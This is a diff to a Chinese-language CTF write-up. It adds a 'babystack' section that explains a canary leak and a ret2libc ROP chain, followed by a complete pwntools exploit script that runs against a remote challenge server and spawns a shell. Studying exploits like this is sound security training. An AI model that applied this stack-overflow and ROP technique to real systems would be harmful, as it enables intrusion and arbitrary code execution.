@@ -64,7 +64,7 @@ after align	               							     some span
 			 			low                                  |      ....................         |
 ```
 
-											 												
+
 &emsp;&emsp;返回的时候就恢复ecx的值然后直接利用 **[ecx - 4]** 回到return_addr1的位置。
 
 因此，payload如下：  
@@ -142,4 +142,101 @@ sh.sendline("5")
 
 sh.interactive()
 ```
+
+### pwn1 babystack  
+
+&emsp;&emsp;checksec后我们发现程序开启了canary，大概要进行canary的泄漏。  
+
+![checksec](../pictures/babstack_1.png)  
+
+&emsp;&emsp;在对main函数进行静态分析后我们发现了一个明显的溢出点，** read()** 函数存在经典溢出，而且在  **case 2** 处我们可以通过 **puts()** 函数泄露canary的值。  
+
+![overflow](../pictures/babstack_2.png)
+
+&emsp;&emsp;对于canary的泄漏方式，最简单的一种是覆盖其最低为的 *\x00* 字节，防止截断，然后通过puts将其泄漏出来。  
+
+&emsp;&emsp;仔细审计程序之后，我们基本清楚了攻击流程，首先这是一个经典的菜单类程序，通过case 1我们可以覆盖栈上的数据，因此，第一步我们先填充padding来覆盖canary的低位字节经计算offset为136个字节。
+
+![canary](../pictures/babstack_3.png)
+
+&emsp;&emsp;接着case 2打印canary，第二步，我们要通过rop来泄露system与bin_sh的地址。查询后发现了比较好用的 `pop rdi ; ret` .这个时候payload已经基本清楚了，用puts泄漏计算偏移，然后case 3退出是返回到main，接着case 3退出返回到system。  
+
+```python
+#!/usr/bin/env python
+from pwn import *
+
+#  sh = process('./babystack')
+sh = remote('111.198.29.45',35646) 
+context.log_level = 'debug'
+elf = ELF('./babystack')
+libc = ELF('./libc-2.23.so')
+
+puts_got = elf.got['puts']
+puts_plt = elf.symbols['puts']
+puts_libc = libc.symbols['puts']
+system_libc = libc.symbols['system']
+pop_rdi = 0x00400a93
+main = 0x00400908
+log.info('puts_got ' + hex(puts_got))
+log.info('puts_plt ' + hex(puts_plt))
+log.info('puts_libc ' + hex(puts_libc))
+
+padding = 'a' * 136
+
+#get_canary
+sh.recvuntil('>> ')
+sh.sendline('1')
+sh.sendline(padding)
+sh.recvuntil('>> ')
+sh.sendline('2')
+sh.recvuntil('a' * 136)
+canary = u64(sh.recv()[:8]) - 0xa
+log.info('canary ' + hex(canary))
+
+#get_system
+def getTarget(target, canary):
+    payload = 'a' * (0x90 - 0x8) + p64(canary) + 'b' * 8 + p64(pop_rdi) + p64(target) + p64(puts_plt)
+    payload += p64(main)
+    sh.recvuntil('>> ')
+    sh.sendline('1')
+    sleep(0.01)
+    sh.sendline(payload)
+    sh.recvuntil('>> ')
+    sh.sendline('3')
+    #  sh.recvuntil('b'*8)
+    addr = u64(sh.recv()[:6].ljust(8, '\x00'))
+    return addr
+
+sh.sendline('\n')
+sh.recv()
+puts_addr = getTarget(puts_got, canary)
+log.info('puts_addr ' + hex(puts_addr))
+
+#get_offset_system_bin_sh 
+offset = puts_addr - puts_libc
+system_addr = system_libc + offset 
+bin_sh = offset + libc.search("/bin/sh").next()
+log.info('system_addr ' + hex(system_addr))
+log.info('bin_sh ' + hex(bin_sh))
+
+#fuckup
+sh.sendline('\n')
+sh.recv()
+sh.sendline('1')
+payload = 'a' * (0x90 - 0x8) + p64(canary) + 'b' * 8 + p64(pop_rdi) + p64(bin_sh) + p64(system_addr)
+payload += p64(main)
+sh.sendline(payload)
+sh.recv()
+sh.sendline('3')
+
+sh.interactive()
+```
+&emsp;&emsp;在输入输出那里比较坑，需要多调几下。
+
+
+
+
+
+
+
 
